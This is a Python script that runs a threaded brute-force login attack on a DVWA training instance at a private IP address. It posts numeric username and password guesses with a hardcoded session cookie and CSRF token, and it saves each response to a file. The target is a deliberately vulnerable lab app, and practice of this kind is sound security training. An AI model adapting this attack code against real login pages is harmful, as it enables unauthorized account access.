import requests
import time
import threading


def web_login(number):
    url = "http://172.16.29.68/DVWA/login.php"
    cookie = "security=impossible; UM_distinctid=17fc92fc5bd1fd-0e40537933b164-5617195f-e1000-17fc92fc5be244; security_level=1; 4BbB_2132_saltkey=xd77St5d; 4BbB_2132_lastvisit=1649231928; CNZZDATA1280971588=1535221277-1648347800-%7C1649414512; PHPSESSID=5rj7ji7jbf7agjcgbm7lsbtq13"
    post_data = {"username": number,
                 "password": number,
                 "Login": "Login",
                 "user_token": "29692e720ec261eef4352184a2dc6aaf"}
    post_html = requests.post(url, data=post_data, headers={'Cookie': cookie})
    print(post_html, number)
    strprint = str(post_html.text)
    name = str(number)+".html"
    f = open(str(name), "w", encoding="utf-8")
    f.write(str(strprint))
    f.close()


def main():
    for number in range(10, 2001):
        t = threading.Thread(target=web_login, args=(number,))
        time.sleep(0.01)
        t.start()


if __name__ == '__main__':
    main()
